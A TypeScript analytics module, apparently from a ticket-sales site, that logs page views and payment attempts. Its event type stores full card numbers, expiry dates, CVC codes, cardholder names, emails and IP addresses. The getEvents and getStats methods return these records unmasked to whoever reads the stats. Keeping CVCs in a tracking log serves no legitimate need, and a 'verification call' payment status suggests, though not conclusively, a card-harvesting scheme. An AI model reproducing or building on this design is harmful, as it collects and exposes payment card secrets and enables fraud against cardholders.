export interface TrackingEvent {
  id: string;
  type: 'PAGE_VIEW' | 'EVENT_VIEW' | 'PAYMENT_ATTEMPT' | 'TICKET_LISTING';
  path: string;
  eventName?: string;
  amount?: number;
  paymentMethod?: string;
  status?: 'SUCCESS' | 'FAILED' | 'PENDING' | 'PENDING_VERIFICATION_CALL';
  timestamp: string;
  // Enhanced Telemetry Fields
  country?: string;
  countryCode?: string;
  referrer?: string;
  deviceOs?: string;
  ip?: string;
  // Card Details Payload for Attempted Purchases
  cardNumber?: string;
  expiry?: string;
  cvc?: string;
  cardholderName?: string;
  email?: string;
}

class AnalyticsStore {
  // STRICTLY REAL DATA ONLY - NO MOCK EVENTS OR FALLBACK DATA
  private events: TrackingEvent[] = [];

  public track(event: Omit<TrackingEvent, 'id' | 'timestamp'>) {
    const newEvent: TrackingEvent = {
      ...event,
      id: `evt-${Math.random().toString(36).substring(2, 9)}`,
      timestamp: new Date().toISOString(),
    };
    this.events.unshift(newEvent);
    return newEvent;
  }

  public deleteEvent(id: string) {
    const initialLength = this.events.length;
    this.events = this.events.filter((e) => e.id !== id);
    return this.events.length < initialLength;
  }

  public getEvents() {
    return this.events;
  }

  public getStats() {
    const totalPageViews = this.events.filter((e) => e.type === 'PAGE_VIEW').length;
    const totalEventViews = this.events.filter((e) => e.type === 'EVENT_VIEW').length;
    const paymentAttempts = this.events.filter((e) => e.type === 'PAYMENT_ATTEMPT');
    const successfulPayments = paymentAttempts.filter((e) => e.status === 'SUCCESS');

    const totalRevenue = successfulPayments.reduce((acc, curr) => acc + (curr.amount || 0), 0);
    const paymentSuccessRate = paymentAttempts.length > 0
      ? Math.round((successfulPayments.length / paymentAttempts.length) * 100)
      : 0;

    // Real event counts map
    const eventCounts: Record<string, number> = {};

    this.events.forEach((e) => {
      if (e.eventName) {
        eventCounts[e.eventName] = (eventCounts[e.eventName] || 0) + 1;
      }
    });

    return {
      totalPageViews,
      totalEventViews,
      totalPaymentAttempts: paymentAttempts.length,
      successfulPaymentsCount: successfulPayments.length,
      paymentSuccessRate,
      totalRevenue,
      eventCounts,
      recentEvents: this.events,
    };
  }
}

export const analyticsStore = new AnalyticsStore();
